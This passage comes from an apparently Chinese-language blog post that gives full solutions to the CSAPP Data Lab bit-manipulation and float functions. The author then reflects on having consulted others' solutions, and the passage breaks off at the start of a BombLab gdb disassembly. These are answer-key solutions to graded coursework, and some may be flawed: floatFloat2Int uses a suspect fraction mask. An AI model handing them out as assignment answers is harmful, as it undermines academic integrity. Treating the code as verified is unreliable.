arithmetically.</span><br><span class="line">  <span class="number">3.</span> Has unpredictable behavior when shifting <span class="keyword">if</span> the shift amount</span><br><span class="line">     is less than <span class="number">0</span> <span class="keyword">or</span> greater than <span class="number">31.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXAMPLES OF ACCEPTABLE CODING STYLE:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">pow2plus1</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; x) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus4 - returns 2^x + 4, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">pow2plus4</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="keyword">int</span> result = (<span class="number">1</span> &lt;&lt; x);</span><br><span class="line">     result += <span class="number">4</span>;</span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">FLOATING POINT CODING RULES</span><br><span class="line"></span><br><span class="line">For the problems that require you to implement floating-point operations,</span><br><span class="line">the coding rules are less strict.  You are allowed to use looping <span class="keyword">and</span></span><br><span class="line">conditional control.  You are allowed to use both ints <span class="keyword">and</span> unsigneds.</span><br><span class="line">You can use arbitrary integer <span class="keyword">and</span> <span class="keyword">unsigned</span> constants. You can use any arithmetic,</span><br><span class="line">logical, <span class="keyword">or</span> comparison operations on <span class="keyword">int</span> <span class="keyword">or</span> <span class="keyword">unsigned</span> data.</span><br><span class="line"></span><br><span class="line">You are expressly forbidden to:</span><br><span class="line">  <span class="number">1.</span> Define <span class="keyword">or</span> use any macros.</span><br><span class="line">  <span class="number">2.</span> Define any additional functions in <span class="keyword">this</span> file.</span><br><span class="line">  <span class="number">3.</span> Call any functions.</span><br><span class="line">  <span class="number">4.</span> Use any form of casting.</span><br><span class="line">  <span class="number">5.</span> Use any data type other than <span class="keyword">int</span> <span class="keyword">or</span> <span class="keyword">unsigned</span>.  This means that you</span><br><span class="line">     cannot use arrays, structs, <span class="keyword">or</span> unions.</span><br><span class="line">  <span class="number">6.</span> Use any floating point data types, operations, <span class="keyword">or</span> constants.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTES:</span><br><span class="line">  <span class="number">1.</span> <span class="function">Use the <span class="title">dlc</span> <span class="params">(data lab checker)</span> <span class="title">compiler</span> <span class="params">(described in the handout)</span> to </span></span><br><span class="line">     check the legality of your solutions.</span><br><span class="line">  <span class="number">2.</span> <span class="function">Each function has a maximum number of <span class="title">operations</span> <span class="params">(integer, logical,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">or</span> comparison)</span> that you are allowed to use <span class="keyword">for</span> your implementation</span></span><br><span class="line">     of the function.  The max operator count is checked by dlc.</span><br><span class="line">     <span class="function">Note that <span class="title">assignment</span> <span class="params">(<span class="string">&#x27;=&#x27;</span>)</span> is <span class="keyword">not</span> counted</span>; you may use as many of</span><br><span class="line">     these as you want without penalty.</span><br><span class="line">  <span class="number">3.</span> Use the btest test harness to check your functions <span class="keyword">for</span> correctness.</span><br><span class="line">  <span class="number">4.</span> Use the BDD checker to formally verify your functions</span><br><span class="line">  <span class="number">5.</span> The maximum number of ops <span class="keyword">for</span> each function is given in the</span><br><span class="line">     header comment <span class="keyword">for</span> each function. If there are any inconsistencies </span><br><span class="line">     between the maximum ops in the writeup <span class="keyword">and</span> in <span class="keyword">this</span> file, consider</span><br><span class="line">     <span class="keyword">this</span> file the authoritative source.</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * STEP 2: Modify the following functions according the coding rules.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   IMPORTANT. TO AVOID GRADING SURPRISES:</span></span><br><span class="line"><span class="comment"> *   1. Use the dlc compiler to check that your solutions conform</span></span><br><span class="line"><span class="comment"> *      to the coding rules.</span></span><br><span class="line"><span class="comment"> *   2. Use the BDD checker to formally verify that your solutions produce </span></span><br><span class="line"><span class="comment"> *      the correct answers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * x ^ y = (~x &amp; y) + (x &amp; ~y)</span></span><br><span class="line"><span class="comment">     * De Morgan&#x27;s Law : x + y = ~(x &amp; y)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> part_one = ~((~x) &amp; y);</span><br><span class="line">    <span class="keyword">int</span> part_two = ~((~y) &amp; x);</span><br><span class="line">    <span class="keyword">return</span> ~(part_one &amp; part_two);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; <span class="number">31</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * only when x = 0x7fffffff or x = 0xffffffff, x + x + 2 = 0</span></span><br><span class="line"><span class="comment">     * !(x + 1) is designed to distinguish between the two</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> !((x + x + <span class="number">2</span>) | (!(x + <span class="number">1</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">16</span>) &amp; x;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">8</span> ) &amp; x;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">4</span> ) &amp; x;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">2</span> ) &amp; x;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">1</span> ) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (~x) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * assume x = 0xMN</span></span><br><span class="line"><span class="comment">     * part_one check whether M is 3</span></span><br><span class="line"><span class="comment">     * part_two check whether N is bigger than 9</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> part_one = (x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0x3</span>;</span><br><span class="line">    <span class="keyword">int</span> part_two = (x &gt;&gt; <span class="number">3</span>) &amp; (((x &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) | ((x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> !(part_one | part_two);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    x = (x &lt;&lt; <span class="number">16</span>) | x;</span><br><span class="line">    x = (x &lt;&lt; <span class="number">8</span> ) | x;</span><br><span class="line">    x = (x &lt;&lt; <span class="number">4</span> ) | x;</span><br><span class="line">    x = (x &lt;&lt; <span class="number">2</span> ) | x;</span><br><span class="line">    x = (x &lt;&lt; <span class="number">1</span> ) | x;</span><br><span class="line">    x = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> (x &amp; y) + ((~x) &amp; z);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x_sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> y_sign = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> y_twos_complement = (~y) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if x == y,x_equal_y = 1</span></span><br><span class="line">    <span class="keyword">int</span> x_equal_y = !(x ^ y);</span><br><span class="line">    <span class="comment">// when x &gt; 0, y &gt; 0, if x &lt; y, then xpyp is negative</span></span><br><span class="line">    <span class="keyword">int</span> xpyp = ((~(x_sign | y_sign)) &amp; (x + y_twos_complement)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="comment">// if x &lt; 0, y &gt; 0, xnyp always be negative</span></span><br><span class="line">    <span class="keyword">int</span> xnyp = (x_sign &amp; (~y_sign));</span><br><span class="line">    <span class="comment">// when x &lt; 0, y &lt; 0, if x &lt; y, then xnyn is negative</span></span><br><span class="line">    <span class="keyword">int</span> xnyn = ((x_sign &amp; y_sign) &amp; (x + y_twos_complement)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (x_equal_y + xpyp + xnyp + xnyn) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">16</span>) | x;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">8</span> ) | x;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">4</span> ) | x;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">2</span> ) | x;</span><br><span class="line">    x = (x &gt;&gt; <span class="number">1</span> ) | x;</span><br><span class="line">    <span class="keyword">return</span> (~x) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> minus_power16 = (~(<span class="number">1</span> &lt;&lt; <span class="number">16</span>)) + <span class="number">1</span>;   <span class="comment">// - 2 ^ 16</span></span><br><span class="line">    <span class="keyword">int</span> minus_power8 = (~(<span class="number">1</span> &lt;&lt; <span class="number">8</span>)) + <span class="number">1</span>;     <span class="comment">// - 2 ^ 8</span></span><br><span class="line">    <span class="keyword">int</span> minus_power4 = (~<span class="number">16</span>) + <span class="number">1</span>;           <span class="comment">// - 2 ^ 4</span></span><br><span class="line">    <span class="keyword">int</span> minus_power2 = (~<span class="number">4</span>) + <span class="number">1</span>;            <span class="comment">// - 2 ^ 2</span></span><br><span class="line">    <span class="keyword">int</span> minus_power1 = (~<span class="number">2</span>) + <span class="number">1</span>;            <span class="comment">// - 2 ^ 1</span></span><br><span class="line">    <span class="keyword">int</span> tempX, tempAns;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// if x is greater than 0, x stays the same, otherwise we reverse it</span></span><br><span class="line">    x = ((~sign) &amp; x) | (sign &amp; (~x));</span><br><span class="line"></span><br><span class="line">    tempX = (x + minus_power16) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    tempAns = ((~tempX) &amp; <span class="number">16</span>);</span><br><span class="line">    ans += tempAns;</span><br><span class="line">    x &gt;&gt;= tempAns;</span><br><span class="line"></span><br><span class="line">    tempX = (x + minus_power8) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    tempAns = ((~tempX) &amp; <span class="number">8</span>);</span><br><span class="line">    ans += tempAns;</span><br><span class="line">    x &gt;&gt;= tempAns;</span><br><span class="line"></span><br><span class="line">    tempX = (x + minus_power4) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    tempAns = ((~tempX) &amp; <span class="number">4</span>);</span><br><span class="line">    ans += tempAns;</span><br><span class="line">    x &gt;&gt;= tempAns;</span><br><span class="line"></span><br><span class="line">    tempX = (x + minus_power2) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    tempAns = ((~tempX) &amp; <span class="number">2</span>);</span><br><span class="line">    ans += tempAns;</span><br><span class="line">    x &gt;&gt;= tempAns;</span><br><span class="line"></span><br><span class="line">    tempX = (x + minus_power1) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    tempAns = ((~tempX) &amp; <span class="number">1</span>);</span><br><span class="line">    ans += tempAns;</span><br><span class="line">    x &gt;&gt;= tempAns;</span><br><span class="line"></span><br><span class="line">    tempX = (x + (~<span class="number">0</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    tempAns = ((~tempX) &amp; <span class="number">1</span>);</span><br><span class="line">    ans += tempAns;</span><br><span class="line">    x &gt;&gt;= tempAns;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> sign = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) &amp; uf;</span><br><span class="line">    <span class="keyword">unsigned</span> exponent = (sign ^ uf) &gt;&gt; <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> frac = (sign | (exponent &lt;&lt; <span class="number">23</span>)) ^ uf;</span><br><span class="line">    <span class="keyword">if</span> (exponent == <span class="number">0xff</span>) <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (exponent == <span class="number">0xfe</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> sign | (<span class="number">0xff</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (exponent == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> sign | (frac &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> sign | ((exponent + <span class="number">1</span>) &lt;&lt; <span class="number">23</span>) | frac;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> sign = uf &amp; <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">int</span> exponent = ((sign ^ uf) &gt;&gt; <span class="number">23</span>) - <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> frac = uf &amp; <span class="number">0x7ffff</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exponent &gt; <span class="number">30</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (exponent &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (exponent &gt;= <span class="number">23</span>)</span><br><span class="line">        ans = (frac | <span class="number">0x800000</span>) &lt;&lt; (exponent - <span class="number">23</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ans = (frac | <span class="number">0x800000</span>) &gt;&gt; (<span class="number">23</span> - exponent);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sign)</span><br><span class="line">        ans = (~ans) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">128</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x &gt;= <span class="number">-126</span>) <span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x &gt;= <span class="number">-150</span>) <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; (x + <span class="number">150</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><p>在看CSAPP之前已经在许多课程中学过关于原码反码补码浮点数位运算等知识了，阅读本书第二章时总觉得自己都懂，没什么新东西了。于是乎直接被家庭作业及LAB教做人</p>
<p>这LAB可真够硬的</p>
<p>确实该保持谦卑：看似这些东西已经学了好几遍，都是草草了解基本概念，几乎没有上手实操过，比如将所学的知识投入应用解决什么实际问题啥的。感谢CSAPP给我这么一个机会，这课程评价如此之高，LAB足够硬核且有趣功不可没</p>
<p>让我沮丧的是有几个函数我没能独自完成，还没拼尽全力就放弃，求助于题解。按作者对CMU学子的要求，这种行为是作弊。我得承认我确实是作弊了，这弄得我很沮丧。当阅读了别人的题解后，我既惊叹于他们的思路与技巧，直呼“还可以这样”，但转念一想其实自己再努把力也未必想不到。但确实没能完全独自完成，后悔不及。</p>
<p>知耻而后勇，以此次作弊为鉴，之后的学习放低姿态，认真按照要求好好弄吧！</p>
<h1 id="BombLab"><a href="#BombLab" class="headerlink" title="BombLab"></a>BombLab</h1><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">反汇编main函数，找到phase_1()函数入口</span><br><span class="line">(gdb) disassemble main</span><br><span class="line">	...</span><br><span class="line">   0x0000000000400e32 &lt;+146&gt;:	callq  0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000400e37 &lt;+151&gt;:	mov    %rax,%rdi</span><br><span class="line">   0x0000000000400e3a &lt;+154&gt;:	callq  0x400ee0 &lt;phase_1&gt;</span><br><span class="line">	...</span><br><span class="line">	</span><br><span class="line">phase_1()函数首地址为0x400ee0，接着反汇编phase_1()函数</span><br><span class="line">(gdb) disassemble 0x400ee0</span><br><span class="line">Dump of assembler code 